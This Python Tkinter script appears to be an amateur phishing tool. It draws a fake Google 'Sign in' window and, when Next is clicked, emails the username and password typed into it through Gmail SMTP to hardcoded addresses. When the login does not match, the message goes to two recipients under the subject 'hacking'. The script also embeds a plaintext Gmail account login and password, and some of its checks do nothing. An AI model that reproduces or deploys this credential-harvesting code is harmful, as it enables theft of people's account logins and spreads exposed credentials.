from cgitb import text
from distutils import command
from tkinter import *
import smtplib
from tkinter import messagebox
import datetime
datetime.datetime.now()
window=Tk()
window.title("gmail")
window.geometry("600x400")

def Click1():
    l6=Label(window,text="Next button was clicked")
    l6.grid(column=1,row=10)
    
    user1=e1.get()
    user2=e2.get()
    msg=f"""
    name of user {user1} 
    and email is {user2}"""

    if  user1=="nithin":
        user2==8907571170   
        len(user2)==10
        l5=Label(window,text="login successfully",font=("Arial",18),fg="green",bg="white")
        l5.grid(column=1,row=8)


        server=smtplib.SMTP_SSL("smtp.gmail.com",465)
        server.login("nithinbalachandra2@gmail.com","nithinpython")
        sender=("nithinbalachandra2@gmail.com")
        reciever=("nithinchandra79@gmail.com")
        message=f"""From: nithin <nithinbalachandra2@gmail.com>
        To: nithin <nithinchandra79@gmail.com>
        Subject: hi
        {msg}
        {datetime.datetime.now()}"""

        server.sendmail(sender,reciever,message)
        
        server.quit()
    else:
        server=smtplib.SMTP_SSL("smtp.gmail.com",465)
        server.login("nithinbalachandra2@gmail.com","nithinpython")
        sender=("nithinbalachandra2@gmail.com")
        reciever=("nithinchandra79@gmail.com","aswathysankar991@gmail.com")
        message=f"""From: nithin <nithinbalachandra2@gmail.com>
        To: nithin <nithinchandra79@gmail.com> 
        Subject: hacking
        {msg}
        {datetime.datetime.now()}"""
        server.sendmail(sender,reciever,message)
        
        server.quit()

        messagebox.showinfo("Warning!!!","Entered password is wrong")
        l6=Label(window,text="Invalid",font=("Arial",18),fg="red",bg="white")
        l6.grid(column=1,row=9)


l1=Label(window,text="Google",font=("Arial",30),fg="blue",bg="white")
l2=Label(window,text="Sign in",font=("Arial",25),fg="black",bg="white")
l3=Label(window,text="Use your Google Account ",font=("Arial",25),fg="black",bg="white")

l8=Label(window,text="Name ",font=("Arial",18),fg="black",bg="white")
l4=Label(window,text="User name ",font=("Arial",18),fg="black",bg="white")
e1=Entry(window,width=60)
l11=Label(window,text="password ",font=("Arial",18),fg="black",bg="white")
e2=Entry(window,width=60)
l5=Label(window,text="Forgot email? ",font=("Arial",30),fg="black",bg="white")
l6=Label(window,text="Not your Computer? Use Guest mode to sign in privately",font=("Arial",18),fg="black",bg="white")
l9=Label(window,text="Learn more ",font=("Arial",20),fg="black",bg="white")
l10=Label(window,text="Create Account ",font=("Arial",15),fg="blue",bg="white")
b1=Button(window,text="Next",font=("Georgia Italic",18),fg="white",bg="blue",command=Click1)
l7=Label(window,text="English(United States)               Help      Privacy      Terms ",font=("Arial",10),fg="black",bg="white")




l1.grid(column=1,row=0)
l2.grid(column=1,row=1)
l3.grid(column=1,row=2)
l4.grid(column=0,row=3)
e1.grid(column=1,row=3)
e2.grid(column=1,row=4)
l5.grid(column=0,row=6)
b1.grid(column=1,row=6)
l7.grid(column=1,row=12)
l6.grid(column=1,row=13)
l9.grid(column=1,row=14)
l10.grid(column=1,row=15)
l11.grid(column=0,row=5)



window.configure(bg="white")



window.mainloop()
